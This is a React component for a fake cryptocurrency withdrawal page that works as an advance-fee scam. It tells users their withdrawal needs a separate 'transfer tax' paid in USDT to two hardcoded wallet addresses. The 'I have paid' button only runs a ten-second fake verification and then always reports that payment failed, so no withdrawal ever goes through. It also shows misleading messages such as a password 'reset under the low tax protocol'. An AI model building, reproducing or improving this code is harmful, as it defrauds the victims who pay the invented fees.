
import React, { useState, useEffect } from 'react';
import { ChevronLeft, CheckCircle2, Loader2, AlertCircle, Copy, Check } from 'lucide-react';
import { supabase } from '../lib/supabase.ts';

interface WithdrawalPageProps {
  onBack: () => void;
}

const BinanceIcon: React.FC<{ size: string }> = ({ size }) => (
  <div className={`${size} relative flex items-center justify-center overflow-hidden rounded-full bg-gradient-to-br from-[#4FC3F7] via-[#2196F3] to-[#1976D2] shadow-md`}>
    <div className="absolute left-[45%] w-[45%] h-[45%] bg-white/40 transform rotate-45 translate-x-[10%]"></div>
    <div className="absolute left-[45%] w-[45%] h-[45%] bg-white/25 transform rotate-45 translate-x-[25%]"></div>
    <div className="absolute left-[45%] w-[45%] h-[45%] bg-white/15 transform rotate-45 translate-x-[40%]"></div>
    <div className="relative w-[48%] h-[48%] bg-white transform rotate-45 flex items-center justify-center shadow-sm z-10">
      <div className="transform -rotate-45 text-[#1976D2] flex items-center justify-center font-black text-[12px] leading-none">
        B
      </div>
    </div>
  </div>
);

const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack }) => {
  const [amount, setAmount] = useState('');
  const [password, setPassword] = useState('');
  const [profile, setProfile] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [showTaxDialog, setShowTaxDialog] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationFailed, setVerificationFailed] = useState(false);
  const [toast, setToast] = useState<{ message: string; type: 'error' | 'info' } | null>(null);
  const [copyStatus, setCopyStatus] = useState<'trc' | 'bep' | null>(null);

  useEffect(() => {
    const fetchProfile = async () => {
      const { data: { user } } = await supabase.auth.getUser();
      if (user) {
        const { data } = await supabase
          .from('profiles')
          .select('*')
          .eq('id', user.id)
          .single();
        if (data) setProfile(data);
      }
      setLoading(false);
    };
    fetchProfile();
  }, []);

  const handleCopy = (text: string, type: 'trc' | 'bep') => {
    navigator.clipboard.writeText(text);
    setCopyStatus(type);
    setTimeout(() => setCopyStatus(null), 2000);
  };

  const handleOK = () => {
    if (!amount || !password) return;

    const withdrawAmount = parseFloat(amount);
    const maxWithdrawable = (profile?.balance || 0) * 0.7;

    if (withdrawAmount > maxWithdrawable) {
      setToast({ message: 'The entered amount is greater than the withdrawable balance after discount.', type: 'error' });
      setTimeout(() => setToast(null), 3000);
      return;
    }

    if (password !== profile?.customer_code) {
      setToast({ message: 'Withdrawal password has been reset under the low tax protocol.', type: 'info' });
      setTimeout(() => setToast(null), 4000);
      return;
    }

    // If valid, show tax dialog
    setShowTaxDialog(true);
  };

  const handlePaidContinue = () => {
    setIsVerifying(true);
    setTimeout(() => {
      setIsVerifying(false);
      setVerificationFailed(true);
    }, 10000);
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#F8F9FB]">
        <Loader2 className="animate-spin text-[#6B4447]" size={40} />
      </div>
    );
  }

  return (
    <div className="flex flex-col min-h-screen bg-[#F8F9FB] animate-in fade-in slide-in-from-right duration-300 font-sans withdrawal-page relative" dir="ltr">
      {/* Header */}
      <div className="bg-white px-4 py-4 flex items-center border-b border-gray-200">
        <button onClick={onBack} className="text-gray-800">
          <ChevronLeft size={28} strokeWidth={2.5} />
        </button>
        <h1 className="flex-1 text-center text-[19px] font-bold text-[#333] mr-8">Withdrawal</h1>
      </div>

      {/* Virtual Currency Selection */}
      <div className="p-5">
        <div className="bg-white rounded-[10px] p-4 border border-gray-300 shadow-sm w-[115px] h-[115px] relative flex flex-col items-center justify-center overflow-hidden">
          <BinanceIcon size="w-14 h-14" />
          <div className="mt-2 text-center">
            <p className="text-[13px] font-bold text-[#6B5E5E] leading-[1.2]">virtual</p>
            <p className="text-[13px] font-bold text-[#6B5E5E] leading-[1.2]">currency</p>
          </div>
          <div className="absolute bottom-0 right-0 w-8 h-8">
            <div className="absolute bottom-0 right-0 w-0 h-0 border-style-solid border-t-[32px] border-t-transparent border-r-[32px] border-r-red-600"></div>
            <div className="absolute bottom-[2px] right-[2px] text-white">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round">
                <polyline points="20 6 9 17 4 12"></polyline>
              </svg>
            </div>
          </div>
        </div>
      </div>

      {/* Wallet Section */}
      <div className="mt-2">
        <h2 className="px-5 text-[17px] font-bold text-[#333] mb-4">Wallet</h2>
        <div className="bg-white px-5 py-5 flex items-center justify-between border-y border-gray-100">
          <div className="flex items-center gap-4">
            <BinanceIcon size="w-11 h-11" />
            <span className="text-[17px] font-bold text-[#333]">Binance(TRC-20)</span>
          </div>
          <div className="bg-red-600 rounded-full p-0.5 shadow-sm">
            <CheckCircle2 size={18} className="text-white" strokeWidth={3} />
          </div>
        </div>
      </div>

      {/* Amount Input */}
      <div className="mt-4 bg-white px-5 py-4 flex items-center border-y border-gray-100">
        <span className="text-[17px] font-bold text-[#333] w-20">USDT</span>
        <input 
          type="number" 
          placeholder="Please enter the amount" 
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          className="flex-1 text-[16px] outline-none placeholder:text-gray-300 font-medium"
        />
      </div>

      {/* Password Input */}
      <div className="mt-4 px-5">
        <h2 className="text-[17px] font-bold text-[#333] mb-3">Withdrawal password</h2>
        <div className="bg-white rounded-[10px] p-3 border border-gray-100 shadow-sm">
          <input 
            type="password" 
            placeholder="......" 
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full text-xl tracking-[0.4em] outline-none placeholder:text-gray-200"
          />
        </div>
      </div>

      {/* OK Button */}
      <div className="mt-8 p-6">
        <button 
          onClick={handleOK}
          className="w-full bg-[#6B4447] text-white text-[18px] font-bold py-[16px] rounded-[12px] shadow-md active:scale-[0.98] transition-all uppercase"
        >
          OK
        </button>
      </div>

      {/* Toast Notification */}
      {toast && (
        <div className="fixed top-20 left-4 right-4 z-[200] animate-in fade-in slide-in-from-top-4 duration-300" dir="ltr">
          <div className={`${toast.type === 'error' ? 'bg-red-600' : 'bg-blue-600'} text-white px-6 py-4 rounded-2xl shadow-2xl flex items-center gap-3`}>
            {toast.type === 'error' ? <AlertCircle size={20} /> : <CheckCircle2 size={20} />}
            <p className="text-sm font-bold">{toast.message}</p>
          </div>
        </div>
      )}

      {/* Tax Dialog */}
      {showTaxDialog && (
        <div className="fixed inset-0 z-[300] bg-black/60 backdrop-blur-sm flex items-center justify-center p-6 animate-in fade-in duration-300" dir="ltr">
          <div className="bg-white w-full max-w-[380px] rounded-[32px] overflow-hidden shadow-2xl flex flex-col animate-in zoom-in duration-300">
            <div className="bg-[#9B4A4E] p-6 text-white text-center">
              <h3 className="text-xl font-black mb-1">Separate Transfer Fees</h3>
              <p className="text-[11px] opacity-80">External Withdrawal Protocol</p>
            </div>

            <div className="p-6 space-y-5">
              {!verificationFailed ? (
                <>
                  <div className="text-gray-600 text-sm leading-relaxed text-left font-medium">
                    {isVerifying ? (
                      <div className="flex flex-col items-center justify-center py-8 gap-4">
                        <Loader2 className="animate-spin text-[#9B4A4E]" size={40} />
                        <p className="text-[#9B4A4E] font-black animate-pulse">Verifying payment of fees...</p>
                      </div>
                    ) : (
                      <>
                        <p className="mb-4">
                          Due to withdrawal steps outside the standard platform protocol, the coins will be sent to you via independent external computing to ensure speed and security.
                        </p>
                        <p className="mb-4">
                          Therefore, you must pay the separate transfer fees of <span className="text-red-600 font-black text-lg">{profile?.transfer_tax_amount || 0} USDT</span> before completing the process.
                        </p>
                        
                        <div className="space-y-3 mt-6">
                          <div className="bg-gray-50 p-3 rounded-2xl border border-gray-100">
                            <div className="flex justify-between items-center mb-1">
                              <span className="text-[10px] font-bold text-gray-400">TRC20 Address</span>
                              <button onClick={() => handleCopy('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai', 'trc')} className="text-[#9B4A4E]">
                                {copyStatus === 'trc' ? <Check size={14} /> : <Copy size={14} />}
                              </button>
                            </div>
                            <p className="text-[10px] font-mono break-all text-gray-800">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</p>
                          </div>
                          
                          <div className="bg-gray-50 p-3 rounded-2xl border border-gray-100">
                            <div className="flex justify-between items-center mb-1">
                              <span className="text-[10px] font-bold text-gray-400">BEP20 Address</span>
                              <button onClick={() => handleCopy('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d', 'bep')} className="text-[#9B4A4E]">
                                {copyStatus === 'bep' ? <Check size={14} /> : <Copy size={14} />}
                              </button>
                            </div>
                            <p className="text-[10px] font-mono break-all text-gray-800">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</p>
                          </div>
                        </div>
                      </>
                    )}
                  </div>

                  {!isVerifying && (
                    <div className="flex gap-3 pt-2">
                      <button 
                        onClick={handlePaidContinue}
                        className="flex-1 bg-[#9B4A4E] text-white font-bold py-4 rounded-2xl shadow-lg active:scale-95 transition-all text-sm"
                      >
                        I have paid, continue
                      </button>
                      <button 
                        onClick={() => setShowTaxDialog(false)}
                        className="flex-1 bg-gray-100 text-gray-600 font-bold py-4 rounded-2xl active:scale-95 transition-all text-sm"
                      >
                        Not now
                      </button>
                    </div>
                  )}
                </>
              ) : (
                <div className="text-center space-y-6 py-4">
                  <div className="w-20 h-20 bg-red-50 rounded-full flex items-center justify-center mx-auto shadow-inner">
                    <AlertCircle size={40} className="text-red-500" />
                  </div>
                  <div className="space-y-2">
                    <h4 className="text-red-600 font-black text-lg">Payment verification failed</h4>
                    <p className="text-gray-500 text-xs leading-relaxed">
                      Please send the amount of <span className="font-bold text-gray-800">{profile?.transfer_tax_amount || 0} USDT</span> to one of the attached addresses to proceed. No matching payment was found in the records.
                    </p>
                  </div>
                  <button 
                    onClick={() => {
                      setVerificationFailed(false);
                      setIsVerifying(false);
                    }}
                    className="w-full bg-gray-800 text-white font-bold py-4 rounded-2xl shadow-lg active:scale-95 transition-all text-sm"
                  >
                    Try again
                  </button>
                  <button 
                    onClick={() => setShowTaxDialog(false)}
                    className="w-full text-gray-400 font-bold text-xs"
                  >
                    Close
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default WithdrawalPage;
